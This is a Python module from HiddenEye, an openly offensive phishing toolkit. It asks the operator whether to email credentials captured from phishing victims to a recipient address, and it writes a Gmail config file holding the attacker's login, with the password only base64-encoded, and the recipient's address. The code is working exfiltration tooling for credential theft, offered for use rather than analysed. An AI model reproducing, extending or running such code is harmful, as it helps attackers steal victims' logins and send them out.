#
#    HiddenEye  Copyright (C) 2020  DarkSec https://dark-sec-official.com
#    This program comes with ABSOLUTELY NO WARRANTY; for details read LICENSE.
#    This is free software, and you are welcome to redistribute it
#    under certain conditions; you can read LICENSE for details.
#
import Defs.ThemeManager.theme as theme
from Defs.ImportManager.unsorted_will_be_replaced import base64
from Defs.ImportManager.unsorted_will_be_replaced import copyfile
from Defs.ImportManager.unsorted_will_be_replaced import getpass
from Defs.ImportManager.unsorted_will_be_replaced import path
from Defs.ImportManager.unsorted_will_be_replaced import run_command
from Defs.ImportManager.unsorted_will_be_replaced import system
from Defs.ImportManager.unsorted_will_be_replaced import wait

default_palette = theme.default_palette


# Ask user to start sending credentials to recipient Email Address.
def captured_data_email_confirmation(port):
    import Defs.ActionManager.simple_informant as simple_informant

    choice = input(
        "\n\n{0}[{1}?{0}] Send Captured Data To Recipient Email Address.\nSend_Email(y/n)>> {2}"
        .format(default_palette[0], default_palette[4],
                default_palette[2])).upper()
    if choice == "Y" or choice == "y":
        if path.isfile("Defs/FeatureManager/EmailManager/emailconfig.py"):
            system("python3 Defs/FeatureManager/EmailManager/SendEmail.py")
        else:
            print(
                "[ERROR!]: NO CONFIG FILE FOUND ! PLEASE CREATE CONFIG FILE FIRST TO USE THIS OPTION."
            )
            wait(2)
            simple_informant.exit_message(port)
    elif choice == "N" or choice == "n":
        simple_informant.exit_message(port)
    else:
        system("clear")
        print("\n\n{0}[{1}^{0}] {2}Please Select A Valid Option.. ".format(
            default_palette[0], default_palette[4], default_palette[2]))
        wait(1)
        system("clear")
        return captured_data_email_confirmation(port)


def captured_data_email_configuration_prompt():
    run_command("clear")
    print("""{1}
        _  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
        {1}http://github.com/darksecdevelopers
        {0}** BY: {1}DARKSEC {0}**""".format(default_palette[0],
                                             default_palette[2]))
    print(
        "-------------------------------\n{0}[ PROMPT: CONFIG EMAIL CREDENTIAL FILE ]{1}!! {0}\n-------------------------------"
        .format(default_palette[0], default_palette[4]))
    # run_command('cp Defs/FeatureManager/EmailManager/EmailConfigDefault.py Defs/FeatureManager/EmailManager/emailconfig.py')
    copyfile(
        "Defs/FeatureManager/EmailManager/EmailConfigDefault.py",
        "Defs/FeatureManager/EmailManager/emailconfig.py",
    )
    GMAILACCOUNT = input("{0}[{1}+{0}] Enter Your Gmail Username:{1} ".format(
        default_palette[0], default_palette[4]))
    with open("Defs/FeatureManager/EmailManager/emailconfig.py") as f:
        read_data = f.read()
        c = read_data.replace("GMAILACCOUNT", GMAILACCOUNT)
        f = open("Defs/FeatureManager/EmailManager/emailconfig.py", "w")
        f.write(c)
        f.close()
        print("{0}[.] {1}Email Address Added To config File. !\n".format(
            default_palette[0], default_palette[4]))
    GMAILPASSWORD = getpass.getpass(
        "{0}[{1}+{0}] Enter Your Gmail Password:{1} ".format(
            default_palette[0], default_palette[4]))
    with open("Defs/FeatureManager/EmailManager/emailconfig.py") as f:
        read_data = f.read()
        GMAILPASSWORD = base64.b64encode(GMAILPASSWORD.encode())
        GMAILPASSWORD = GMAILPASSWORD.decode("utf-8")
        c = read_data.replace("GMAILPASSWORD", GMAILPASSWORD)
        f = open("Defs/FeatureManager/EmailManager/emailconfig.py", "w")
        f.write(c)
        f.close()
        print("{0}[.] {1}Password(Encoded) Added To config File. !\n".format(
            default_palette[0], default_palette[4]))
    RECIPIENTEMAIL = input("{0}[{1}+{0}] Enter Recipient Email:{1} ".format(
        default_palette[0], default_palette[4]))
    with open("Defs/FeatureManager/EmailManager/emailconfig.py") as f:
        read_data = f.read()
        c = read_data.replace("RECIPIENTEMAIL", RECIPIENTEMAIL)
        f = open("Defs/FeatureManager/EmailManager/emailconfig.py", "w")
        f.write(c)
        f.close()
        print("{0}[.] {1}Recipient Email Address Added To config File. !\n".
              format(default_palette[0], default_palette[4]))
        print(
            "\n\n{0}[{1}SUCCESS{0}]: Created Config File & Saved To (Defs/FeatureManager/EmailManager/Config.py)"
            .format(default_palette[0], default_palette[4]))
